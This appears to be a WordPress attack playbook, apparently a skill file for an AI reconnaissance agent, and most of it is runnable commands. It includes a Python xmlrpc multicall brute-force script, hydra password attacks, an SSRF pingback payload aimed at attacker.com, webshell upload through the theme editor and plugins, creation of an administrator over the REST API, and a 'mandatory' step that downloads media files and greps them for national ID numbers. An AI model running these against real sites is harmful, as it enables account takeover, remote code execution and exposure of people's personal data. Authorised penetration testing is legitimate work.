<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: wordpress
description: Security testing playbook for WordPress covering user enumeration, xmlrpc abuse, plugin/theme vulnerabilities, wp-admin brute force, and wpscan methodology
---

# WordPress Security Testing

WordPress powers 40%+ of all websites. Attack surface: wp-login.php brute force, xmlrpc.php abuse, plugin/theme CVEs, user enumeration via multiple vectors, REST API disclosure, and file upload via media.

---

## Reconnaissance

### Fingerprinting WordPress

    # Confirm WordPress installation
    curl -s <target>/ | grep -i "wp-content\|wordpress\|wp-includes"

    # WordPress-specific paths
    GET /wp-login.php                   # Admin login
    GET /wp-admin/                      # Admin dashboard (redirects to login if unauth)
    GET /wp-includes/                   # Core files (should be blocked)
    GET /wp-content/uploads/            # Uploaded files (often has directory listing)
    GET /wp-json/                       # REST API root
    GET /wp-json/wp/v2/                 # REST API v2 (user/post enumeration)
    GET /wp-cron.php                    # WP Cron (DoS vector if public)
    GET /readme.html                    # Exact WordPress version
    GET /license.txt
    GET /wp-includes/version.php        # Version in source

    # Check for common config exposure
    GET /wp-config.php                  # Should return empty or 403 — if not = CRITICAL
    GET /wp-config.php.bak
    GET /wp-config.php.old
    GET /wp-config.txt
    GET /.wp-config.php.swp             # Vim swap file

---

## User Enumeration

### Method 1: Author Archive

    # WordPress reveals usernames via author pages
    GET /?author=1                      # Redirects to /author/<username>/
    GET /?author=2
    GET /?author=3                      # Enumerate until 404

    # Extract username from redirect:
    curl -sI <target>/?author=1 | grep -i location

### Method 2: REST API

    # WordPress REST API exposes all users by default
    GET /wp-json/wp/v2/users
    GET /wp-json/wp/v2/users?per_page=100
    # Returns: id, name, slug (= username), avatar, description

    # If REST API is disabled, try:
    GET /wp-json/wp/v2/users/1
    GET /?rest_route=/wp/v2/users

### Method 3: Login Error Messages

    # Default WordPress distinguishes valid vs invalid usernames in error:
    POST /wp-login.php
    log=admin&pwd=wrongpassword
    # "The password you entered for the username admin is incorrect" → user exists
    # "Invalid username" → user doesn't exist

### Method 4: oEmbed

    GET /wp-json/oembed/1.0/embed?url=<target>&format=json
    # Response contains author_name field

---

## wpscan — Automated Scanning

    # Full scan with API token (recommended):
    wpscan --url <target> --api-token <token> --enumerate u,p,t,vp,vt,tt,cb,dbe

    # Without API token (basic):
    wpscan --url <target> --enumerate u,p,t

    # Enumerate options:
    # u   = users
    # p   = plugins (installed)
    # t   = themes (installed)
    # vp  = vulnerable plugins
    # vt  = vulnerable themes
    # tt  = timthumbs
    # cb  = config backups
    # dbe = db exports

    # Aggressive plugin detection:
    wpscan --url <target> --enumerate p --plugins-detection aggressive

    # Password attack after user enumeration:
    wpscan --url <target> -U admin,administrator,editor -P /usr/share/wordlists/rockyou.txt

    # Stealthy scan (lower request rate):
    wpscan --url <target> --enumerate u --throttle 500

---

## xmlrpc.php Exploitation

xmlrpc.php is enabled by default and allows credential brute force bypassing lockout:

    # Check if xmlrpc.php is enabled
    curl -s -X POST <target>/xmlrpc.php \
      -H "Content-Type: text/xml" \
      -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
    # Returns method list = enabled

    # Brute force via system.multicall (bypass rate limiting):
    # 500+ login attempts in a single HTTP request
    python3 -c "
    import requests, sys

    target = 'http://<target>/xmlrpc.php'
    user = 'admin'
    passwords = open('/usr/share/wordlists/rockyou.txt').read().splitlines()[:500]

    # Build multicall payload
    calls = ''
    for pw in passwords:
        calls += f'''<value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>{user}</string></value>
                <value><string>{pw}</string></value>
            </data></array></value></member>
        </struct></value>'''

    payload = f'''<?xml version=\"1.0\"?><methodCall>
    <methodName>system.multicall</methodName>
    <params><param><value><array><data>
    {calls}
    </data></array></value></param></params>
    </methodCall>'''

    r = requests.post(target, data=payload, headers={'Content-Type': 'text/xml'})
    print(r.text[:2000])
    "

    # SSRF via xmlrpc.php pingback:
    POST /xmlrpc.php
    <?xml version="1.0"?>
    <methodCall><methodName>pingback.ping</methodName>
    <params>
      <param><value><string>http://attacker.com/</string></value></param>
      <param><value><string>http://<target>/</string></value></param>
    </params>
    </methodCall>

---

## Plugin / Theme Vulnerabilities

    # Common vulnerable plugin paths:
    GET /wp-content/plugins/               # Directory listing (if enabled)
    GET /wp-content/themes/

    # After wpscan enumeration, search for CVEs:
    # Site: https://wpscan.com/plugins/<plugin-name>
    # Site: https://www.exploit-db.com/

    # Common high-value plugins to check:
    # - Contact Form 7, WPForms — file upload, CSRF
    # - WooCommerce — payment bypass, IDOR
    # - Elementor — arbitrary file upload (old versions)
    # - Revolution Slider — LFI (CVE-2014-9734)
    # - Yoast SEO — info disclosure
    # - Advanced Custom Fields — SSRF, XSS

    # Exploit vulnerable plugin file upload:
    curl -X POST <target>/wp-admin/admin-ajax.php \
      -F "action=<plugin_upload_action>" \
      -F "file=@shell.php;type=image/jpeg" \
      --cookie "wordpress_logged_in_<hash>=..."

---

## wp-admin Attack

    # Brute force wp-login.php (rate limited — prefer xmlrpc method):
    hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:ERROR"

    # After login — RCE via Theme Editor:
    # WP Admin → Appearance → Theme Editor → 404.php → add PHP webshell
    # GET /wp-content/themes/<theme>/404.php?cmd=id

    # RCE via Plugin Upload:
    # WP Admin → Plugins → Add New → Upload Plugin
    # Upload a ZIP containing malicious plugin with PHP webshell

    # WP Admin → Tools → Theme File Editor (if available)

---

## REST API Exploitation

    # List all posts (may include drafts):
    GET /wp-json/wp/v2/posts?status=draft&context=edit   # Requires auth
    GET /wp-json/wp/v2/posts?per_page=100

    # List all pages including private:
    GET /wp-json/wp/v2/pages

    # Create user (if improper REST auth):
    POST /wp-json/wp/v2/users
    {"username": "attacker", "email": "a@b.com", "password": "pass", "roles": ["administrator"]}

    # JWT Authentication bypass (if JWT plugin installed):
    POST /wp-json/jwt-auth/v1/token
    {"username": "admin", "password": "admin"}

---

## REST API — Media Endpoint (HIGH PRIORITY: PII Exposure Vector)

**MANDATORY CHECK on every WordPress target.** The `/wp-json/wp/v2/media` endpoint is publicly
accessible by default and exposes ALL uploaded file URLs including PDFs, DOCX, and images.
If the site handles user data (forms, registrations, applications), this endpoint can expose
consent forms, identity documents, and other files containing PII.

    # STEP 1: Check total media count (X-WP-Total header reveals scope instantly)
    curl -sk "https://TARGET/wp-json/wp/v2/media?per_page=1" \
      -H "Accept: application/json" -I | grep -i "X-WP-Total"
    # If X-WP-Total: 500+, there are hundreds of potentially sensitive files

    # STEP 2: Enumerate PDFs specifically
    curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=application%2Fpdf&per_page=100&page=1" \
      -H "Accept: application/json" | python3 -c "
import sys, json, re
from urllib.parse import unquote
items = json.load(sys.stdin)
print(f'PDFs found: {len(items)}')
for item in items:
    src = item.get('source_url','')
    fn = unquote(src.split('/')[-1])
    # Flag filenames with long digit sequences (NIK, ID numbers)
    flag = '[PII?]' if re.search(r'\d{12,18}', fn) else ''
    print(f'{flag} {fn}')
    print(f'   URL: {src}')
"

    # STEP 3: Also check DOCX and XLSX
    curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=application%2Fvnd.openxmlformats-officedocument.wordprocessingml.document&per_page=100" \
      -H "Accept: application/json" | python3 -c "
import sys, json
items = json.load(sys.stdin)
print(f'DOCX found: {len(items)}')
for item in items[:10]:
    print(item.get('source_url',''))
"

    # STEP 4: Download and confirm PII in one sample PDF
    PDF_URL="https://TARGET/wp-content/uploads/2024/01/Consent-Form-JohnDoe-1234567890123456.pdf"
    curl -sk "$PDF_URL" -o /tmp/sample.pdf
    pdftotext /tmp/sample.pdf - | grep -iE "NIK|KTP|Nama Lengkap|National ID|Social Security|Passport"

    # STEP 5: Get total affected (ALL MIME types, not just PDF)
    for mime in "application/pdf" "application/msword" "image/jpeg" "image/png"; do
      total=$(curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$mime'))")&per_page=1" \
        -H "Accept: application/json" -D - 2>/dev/null | grep -i 'x-wp-total:' | grep -oE '[0-9]+')
      echo "$mime: ${total:-0} files"
    done

**CRITICAL:** If `/wp-json/wp/v2/media` returns PDFs with names containing long digit strings
(Indonesian NIK = 16 digits, Singaporean NRIC = 9 chars, etc.), this is a HIGH-severity
PII exposure finding. Load `vulnerabilities/sensitive_file_pii_exposure.md` for full
exploitation and confirmation methodology.

**What to report:**
- Total PDF count (from X-WP-Total header)
- Sample of PII-indicating filenames (masked)
- Confirmed PII fields from extracted text (masked)
- Applicable data protection regulation

---

## File Upload / Media

    # Uploaded files at:
    GET /wp-content/uploads/<year>/<month>/<filename>

    # Test: upload PHP as image via media upload (admin):
    # Extension bypass: shell.php.jpg, shell.php%00.jpg, shell.phtml
    # Double extension: shell.jpg.php

    # Directory listing often enabled on /wp-content/uploads/
    GET /wp-content/uploads/
    GET /wp-content/uploads/2024/

---

## Common Security Misconfigurations

    # wp-config.php database credentials (if exposed)
    define('DB_NAME', '...');
    define('DB_USER', '...');
    define('DB_PASSWORD', '...');
    define('AUTH_KEY', '...');         # Secret keys for cookie signing

    # Debug mode (never in production):
    define('WP_DEBUG', true);          # Creates /wp-content/debug.log

    GET /wp-content/debug.log          # May contain error messages with SQL queries, paths, credentials

    # Multisite subdomains (if WP Multisite):
    GET /<site-slug>/wp-login.php

    # Sensitive files exposed:
    GET /wp-cron.php                   # Direct access causes server load (DoS)
    GET /wp-trackback.php              # Old spam vector
    GET /wp-comments-post.php         # Comment spam

---

## Nuclei Templates

    # WordPress-specific nuclei templates
    nuclei -t cms/wordpress/ -u <target>
    nuclei -t cves/ -tags wordpress -u <target>
    nuclei -t vulnerabilities/wordpress/ -u <target>
    nuclei -t exposures/ -tags wordpress -u <target>

---

## Pro Tips

1. Always try `/?author=1` first — reveals admin username instantly in most WP installs
2. xmlrpc.php multicall = 500+ password attempts per HTTP request, no rate limiting
3. `/wp-json/wp/v2/users` returns all usernames if REST API not restricted
4. `readme.html` and `license.txt` reveal exact WP version → targeted CVE lookup
5. wpscan `--plugins-detection aggressive` finds hidden plugins not in page source
6. wp-config.php backup files (`.bak`, `.old`, `.txt`) are common critical findings
7. WooCommerce installations always deserve deep testing — payment logic bypasses are impactful

## Summary

WordPress testing = user enumeration (REST API + author pages) + xmlrpc.php brute force (multicall) + wpscan plugin/theme CVE scan + wp-admin credential attack. The xmlrpc multicall technique bypasses all rate limiting. REST API user enumeration works on most unprotected installs. After getting credentials, RCE via Theme Editor is a one-click webshell. Always check `/wp-content/debug.log` and `wp-config.php` backup files.
